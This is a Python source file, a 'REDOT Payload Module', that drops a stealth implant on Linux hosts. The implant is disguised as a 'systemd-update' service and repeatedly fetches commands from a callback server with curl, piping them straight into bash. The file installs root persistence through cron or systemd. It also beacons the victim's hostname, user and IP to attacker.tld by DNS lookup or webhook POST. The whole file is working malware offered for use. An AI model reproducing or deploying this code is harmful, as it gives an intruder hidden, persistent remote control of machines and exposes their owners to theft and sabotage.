#!/usr/bin/env python3
"""
implant_dropper.py - REDOT Payload Module
Deploys a stealth implant with persistence and remote callback.
"""

import os
import platform
import socket
import getpass
import uuid
import json
import hashlib
import subprocess
from pathlib import Path

# === CONFIGURATION ===
IMPLANT_NAME = "systemd-update"
INSTALL_DIR = "/tmp/.sys"
AGENT_LOG = "logs/implants/agents.log"
CRON_FILE = "/etc/cron.d/systemd-update"
SYSTEMD_FILE = f"/etc/systemd/system/{IMPLANT_NAME}.service"
CALLBACK_PORT = 8443
CALLBACK_HOST = ""  # Autodetect if empty
TLS_ENABLED = True
FALLBACK_METHOD = "dns"  # options: none, dns, webhook
PERSIST_METHOD = "cron"  # or 'systemd'
INJECTED_METADATA = {}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_agent_id():
    base = f"{socket.gethostname()}|{getpass.getuser()}|{uuid.uuid4()}"
    return hashlib.sha256(base.encode()).hexdigest()

def build_implant(agent_id, callback_ip, callback_port, metadata):
    os.makedirs(INSTALL_DIR, exist_ok=True)
    implant_path = os.path.join(INSTALL_DIR, IMPLANT_NAME)

    headers = f"-H 'X-Agent-ID: {agent_id}'"
    for key, value in metadata.items():
        headers += f" -H 'X-Meta-{key}: {value}'"

    scheme = "https" if TLS_ENABLED else "http"

    implant_code = f"""#!/bin/bash
while true; do
  curl -k {headers} {scheme}://{callback_ip}:{callback_port}/cmd | bash
  sleep 30
done
"""
    with open(implant_path, "w") as f:
        f.write(implant_code)
    os.chmod(implant_path, 0o755)
    return implant_path

def install_cron(implant_path):
    cron_line = f"* * * * * root {implant_path} >/dev/null 2>&1\n"
    with open(CRON_FILE, "w") as f:
        f.write(cron_line)
    print(f"[+] Persistence installed via cron: {CRON_FILE}")

def install_systemd(implant_path):
    service_content = f"""[Unit]
Description=System Update Service

[Service]
ExecStart={implant_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
    with open(SYSTEMD_FILE, "w") as f:
        f.write(service_content)
    subprocess.run(["systemctl", "daemon-reexec"])
    subprocess.run(["systemctl", "enable", f"{IMPLANT_NAME}.service"])
    subprocess.run(["systemctl", "start", f"{IMPLANT_NAME}.service"])
    print(f"[+] Persistence installed via systemd: {SYSTEMD_FILE}")

def fallback_mechanism(agent_id, metadata):
    if FALLBACK_METHOD == "dns":
        os.system(f"nslookup {agent_id}.beacon.attacker.tld > /dev/null 2>&1")
    elif FALLBACK_METHOD == "webhook":
        payload = json.dumps({"id": agent_id, "meta": metadata})
        os.system(f"curl -X POST -d '{payload}' https://attacker.tld/webhook")

def log_agent(agent_id, metadata):
    os.makedirs("logs/implants", exist_ok=True)
    with open(AGENT_LOG, "a") as f:
        f.write(f"{agent_id} | {metadata.get('Host')} | {metadata.get('User')} | {metadata.get('IP')}\n")

def drop_implant(extra_metadata=None):
    print("[*] Deploying implant...")
    ip = CALLBACK_HOST if CALLBACK_HOST else get_local_ip()
    agent_id = generate_agent_id()
    metadata = {
        "Host": socket.gethostname(),
        "User": getpass.getuser(),
        "IP": ip
    }
    if extra_metadata:
        metadata.update(extra_metadata)

    implant_path = build_implant(agent_id, ip, CALLBACK_PORT, metadata)

    if PERSIST_METHOD == "cron":
        install_cron(implant_path)
    else:
        install_systemd(implant_path)

    log_agent(agent_id, metadata)
    fallback_mechanism(agent_id, metadata)
    print("[✓] Implant deployed successfully.")

if __name__ == "__main__":
    drop_implant()
